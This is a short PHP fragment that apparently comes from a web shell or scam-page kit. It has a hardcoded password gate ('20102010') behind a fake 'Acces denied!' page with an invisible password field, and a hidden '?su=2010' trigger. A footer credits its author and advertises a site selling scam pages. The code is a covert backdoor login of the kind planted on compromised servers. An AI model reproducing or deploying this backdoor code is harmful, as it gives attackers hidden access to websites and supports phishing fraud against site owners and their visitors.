<?php
session_start();
if(isset($_POST['hchiYdek']) && $_POST['hchiYdek'] == '20102010') {
  $_SESSION['hchiYdek'] = 'zidzid';
}

if(isset($_GET['su']) && $_GET['su'] == '2010'){
...
if(!isset($_SESSION['hchiYdek'])){ ?>
<form method="post" action="">
  <h1><label>Acces denied!</label></h1>
  <input type="password" name="hchiYdek" style="border: 0; background: white;" />
</form>
...
<span class="style1">Cr34t3d  By Sa4d<br>
All Scam Pages Here==>   <font color=\"#800000\">WWW.scam4u.COM</font></span>
